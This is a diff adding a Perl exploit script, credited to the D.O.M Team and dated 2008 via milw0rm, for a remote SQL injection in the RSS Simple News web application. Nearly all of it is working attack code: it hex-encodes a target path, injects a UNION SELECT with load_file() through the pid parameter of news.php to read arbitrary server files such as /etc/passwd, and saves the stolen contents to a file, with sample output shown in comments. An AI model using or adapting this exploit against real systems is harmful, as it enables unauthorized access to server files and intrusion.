@@ -1,0 +1,114 @@
+#!/usr/bin/perl
+################################
+##    Coded by Piker [piker(dot)ther00t(at)gmail(dot)com]
+##      D.O.M Team
+## piker,ka0x,an0de,xarnuz
+## 2008 Security Researchers
+################################
+##
+## RSS Simple News Remote SQL Injection Exploit
+## http://sourceforge.net/projects/rss-simple-news/
+##
+##   This exploit tries to read an
+##   arbitrary file.
+##
+##   It needs magic_quotes_gpc=off
+##
+################################
+
+# piker@domlabs:~/advisories$ perl rss.pl http://localhost/rss /etc/passwd
+#[+] File HEX: 0x2f6574632f706173737764
+#[+] Host: http://localhost/rss/
+#[+] File content:
+#daemon:x:1:1:daemon:/usr/sbin:/bin/sh
+#bin:x:2:2:bin:/bin:/bin/sh
+#sys:x:3:3:sys:/dev:/bin/sh
+#sync:x:4:65534:sync:/bin:/bin/sync
+#games:x:5:60:games:/usr/games:/bin/sh
+# [...]
+#[+] EOF
+#
+#
+
+
+use LWP::UserAgent;
+
+open(FILE, ">&STDOUT");
+
+my $host = $ARGV[0];
+my $file = $ARGV[1];
+
+die &_USO unless $ARGV[1];
+
+sub _USO
+{
+    die "
+    RSS Simple News Remote Sql Injection Exploit
+
+    This exploit tries to read an
+    arbitrary file.
+
+    It needs magic_quotes_gpc=off
+
+    usage: ./$0 <host> <file_you_want>
+    ex: ./$0 http://localhost/rss/ /etc/passwd
+
+    ";
+}
+
+my $ua = LWP::UserAgent->new() or die;
+$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008072820 Firefox/3.0.1");
+
+my $tmp="0x";
+my $tmp2;
+
+foreach my $c (split(//, $file)){
+    $tmp2 = sprintf ("%x", ord($c));
+    $tmp .= $tmp2;
+}
+
+print FILE "[+] File HEX: ".$tmp."\n";
+
+if ($host !~ /\/$/){ $host .= "/"; }
+
+print FILE "[+] Host: ".$host."\n";
+
+my $req = HTTP::Request->new(GET => $host."news.php?pid=-1' union select 1,2,3,4,CONCAT(0x3c46494c453e,load_file(".$tmp."),0x3c46494c453e),6 and 'a'='a");
+my $res = $ua->request($req);
+my $con = $res->content;
+
+my $ok = 0;
+open (OUT, ">result.txt");
+
+if ($res->is_success){
+    foreach my $linea (split(/\n/, $con)){
+        if($ok == 1){
+            if ($linea !~ /<FILE>/){
+                print FILE $linea."\n";
+        print OUT $linea."\n";
+            }else{
+                print FILE "\n[+] EOF\n";
+        print "\n[+] File saved into 'result.txt'\n";
+                goto salida;
+            }
+        }
+        if($linea =~ /<FILE>/i && $ok == 0){
+            $ok = 1;
+            print FILE "[+] File content: \n";
+        }
+    }
+    salida:
+    if ($ok == 0){
+        print FILE "[-] Exploit Failed!\n";
+    }      
+}
+else{
+    print FILE "[-] Exploit Failed!\n";
+}
+
+close(FILE);
+close(OUT);
+
+#EOF
+
+# milw0rm.com [2008-12-22]
